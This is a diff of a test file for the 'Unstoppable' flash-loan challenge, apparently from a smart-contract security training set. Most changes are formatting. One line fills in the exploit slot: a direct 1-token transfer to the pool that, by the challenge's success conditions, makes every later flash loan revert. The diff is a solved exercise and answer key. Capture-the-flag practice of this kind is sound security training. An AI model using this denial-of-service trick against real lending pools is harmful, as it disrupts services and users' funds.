@@ -24,30 +24,24 @@ describe('[Challenge] Unstoppable', function () {
 
         await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
 
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal(TOKENS_IN_POOL);
+        expect(await this.token.balanceOf(this.pool.address)).to.equal(TOKENS_IN_POOL);
 
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);
+        expect(await this.token.balanceOf(attacker.address)).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);
 
-         // Show it's possible for someUser to take out a flash loan
-         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
-         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
-         await this.receiverContract.executeFlashLoan(10);
+        // Show it's possible for someUser to take out a flash loan
+        const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
+        this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
+        await this.receiverContract.executeFlashLoan(10);
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        await this.token.transfer(this.pool.address, 1);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
 
         // It is no longer possible to execute flash loans
-        await expect(
-            this.receiverContract.executeFlashLoan(10)
-        ).to.be.reverted;
+        await expect(this.receiverContract.executeFlashLoan(10)).to.be.reverted;
     });
 });
